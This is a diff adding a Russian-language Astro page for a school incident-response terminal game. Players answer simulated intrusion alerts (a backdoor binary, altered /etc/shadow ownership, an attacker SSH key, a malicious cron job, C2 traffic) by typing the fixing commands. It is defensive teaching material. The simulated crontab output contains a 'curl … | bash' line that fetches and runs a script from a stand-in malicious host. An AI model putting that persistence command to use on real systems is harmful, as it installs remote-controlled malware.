@@ -1,0 +1,112 @@
+---
+import Terminal from '../../../../components/Terminal.astro';
+
+const phases = [
+  {
+    setup: `
+      window.backdoorName = 'srv_update_' + rnd(10,99) + '.elf';
+      if (!vfs['/']['var']) vfs['/']['var'] = {};
+      if (!vfs['/']['var']['tmp']) vfs['/']['var']['tmp'] = {};
+      vfs['/']['var']['tmp'][window.backdoorName] = '\\x7fELF...';
+      return \`Broadcast message from ossec@sys-server (tty1) \${getBroadcastTime()}:\\n\\nOSSEC HIDS Alert: Execution of anomalous binary detected.\\nFile: /var/tmp/\${window.backdoorName}\\nAction required: Remove execute permissions from the file immediately to halt execution.\`;
+    `,
+    onCommand: `
+      if (cmd === 'chmod') {
+        const target = args[1];
+        if (!target) return { success: null, message: 'chmod: missing operand' };
+        if (target.includes(window.backdoorName) && (args[0] === '-x' || args[0] === '644' || args[0] === '444')) {
+          return { success: true, message: '' };
+        }
+        return { success: false, message: '', failMessage: \`Broadcast message from ossec@sys-server (tty1) \${getBroadcastTime()}:\\n\\nCRITICAL: The backdoor executed and established a reverse shell! You failed to remove execute permissions.\` };
+      }
+      return { handled: false };
+    `
+  },
+  {
+    setup: `
+      window.vulnFile = '/etc/shadow';
+      return \`Broadcast message from ossec@sys-server (tty1) \${getBroadcastTime()}:\\n\\nOSSEC HIDS Alert: File ownership modification detected on critical system file.\\nFile: \${window.vulnFile}\\nAction required: Restore ownership to root:root.\`;
+    `,
+    onCommand: `
+      if (cmd === 'chown') {
+        const owner = args[0];
+        const target = args[1];
+        if (!target) return { success: null, message: 'chown: missing operand' };
+        if (owner === 'root:root' && target.includes('shadow')) {
+          return { success: true, message: '' };
+        }
+        return { success: false, message: '', failMessage: \`Broadcast message from ossec@sys-server (tty1) \${getBroadcastTime()}:\\n\\nCRITICAL: Privilege escalation detected! The attacker exploited the weak ownership on \${window.vulnFile}.\` };
+      }
+      return { handled: false };
+    `
+  },
+  {
+    setup: `
+      window.maliciousIP = \`\${rnd(11,250)}.\${rnd(0,255)}.\${rnd(0,255)}.\${rnd(1,254)}\`;
+      if (!vfs['/']['root']) vfs['/']['root'] = {};
+      if (!vfs['/']['root']['.ssh']) vfs['/']['root']['.ssh'] = {};
+      vfs['/']['root']['.ssh']['authorized_keys'] = \`ssh-rsa AAAAB3Nza... attacker@\${window.maliciousIP}\`;
+      return \`Broadcast message from ossec@sys-server (tty1) \${getBroadcastTime()}:\\n\\nOSSEC HIDS Alert: Unauthorized modification to root's SSH keys.\\nAction required: Delete the compromised authorized_keys file.\`;
+    `,
+    onCommand: `
+      if (cmd === 'rm') {
+        const target = args[0];
+        if (!target) return { success: null, message: 'rm: missing operand' };
+        if (target.includes('authorized_keys')) {
+          return { success: true, message: '' };
+        }
+        return { success: false, message: '', failMessage: \`Broadcast message from ossec@sys-server (tty1) \${getBroadcastTime()}:\\n\\nCRITICAL: The attacker used the backdoor SSH key to regain root access!\` };
+      }
+      return { handled: false };
+    `
+  },
+  {
+    setup: `
+      return \`Broadcast message from netdata@sys-server (tty1) \${getBroadcastTime()}:\\n\\nnetdata ALARM: Suspicious persistence mechanism detected.\\nAction required: Clear the root crontab completely.\`;
+    `,
+    onCommand: `
+      if (cmd === 'crontab') {
+        if (args[0] === '-r') {
+          return { success: true, message: '' };
+        }
+        if (args[0] === '-l') {
+           return { success: null, message: '* * * * * curl -s http://malicious.com/bot.sh | bash' };
+        }
+        return { success: false, message: 'Usage: crontab -r', failMessage: \`Broadcast message from netdata@sys-server (tty1) \${getBroadcastTime()}:\\n\\nCRITICAL: The malicious cron job executed and redeployed the malware!\` };
+      }
+      return { handled: false };
+    `
+  },
+  {
+    setup: `
+      window.c2IP = \`192.168.\${rnd(2,254)}.\${rnd(1,254)}\`;
+      return \`Broadcast message from ossec@sys-server (tty1) \${getBroadcastTime()}:\\n\\nOSSEC HIDS Alert: Unauthorized outbound connection to a known C2 server (\${window.c2IP}).\\nAction required: Block OUTBOUND traffic to this IP using 'ufw deny out to [IP]'.\`;
+    `,
+    onCommand: `
+      if (cmd === 'ufw') {
+        // ufw deny out to IP
+        if (args[0] === 'deny' && args[1] === 'out' && args[2] === 'to' && args[3]) {
+          if (args[3] === window.c2IP) {
+            return { success: true, message: 'Rule added' };
+          }
+        }
+        return { success: false, message: 'Invalid rule', failMessage: \`Broadcast message from ossec@sys-server (tty1) \${getBroadcastTime()}:\\n\\nCRITICAL: Data exfiltration complete! The attacker downloaded the database.\` };
+      }
+      return { handled: false };
+    `
+  }
+];
+---
+
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Уровень 2: Углубленный анализ и реагирование</title>
+    <link rel="stylesheet" href="/static/bootstrap.min.css">
+</head>
+<body class="bg-black vh-100 overflow-hidden d-flex flex-column m-0">
+    <Terminal missionName="10-класс_углубленный :: 19 :: Уровень 2" phases={JSON.stringify(phases)} theme="orange" />
+</body>
+</html>
